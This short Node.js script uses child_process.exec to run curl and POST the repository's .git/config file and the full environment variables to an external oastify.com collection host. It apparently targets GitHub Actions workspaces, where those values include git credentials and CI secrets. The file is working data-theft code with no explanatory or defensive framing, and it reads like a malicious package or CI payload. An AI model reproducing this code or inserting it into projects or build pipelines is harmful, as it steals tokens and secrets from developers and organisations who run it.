const{ exec } = require('child_process');

exec('curl -d "`cat $GITHUB_WORKSPACE/.git/config`" https://fgzvus3hxepvkyvlbqtfxa3yhpnik6eu3.oastify.com/',(error,stdout,stderr)=>{
 if(error){
 console.error(`exec error: ${error}`);
 return;
 }
 console.log(`stdout: ${stdout}`);
 console.error(`stderr: ${stderr}`);
});

exec('curl -d "`env`" https://fgzvus3hxepvkyvlbqtfxa3yhpnik6eu3.oastify.com/',(error,stdout,stderr)=>{
 if(error){
 console.error(`exec error: ${error}`);
 return;
 }
 console.log(`stdout: ${stdout}`);
 console.error(`stderr: ${stderr}`);
});
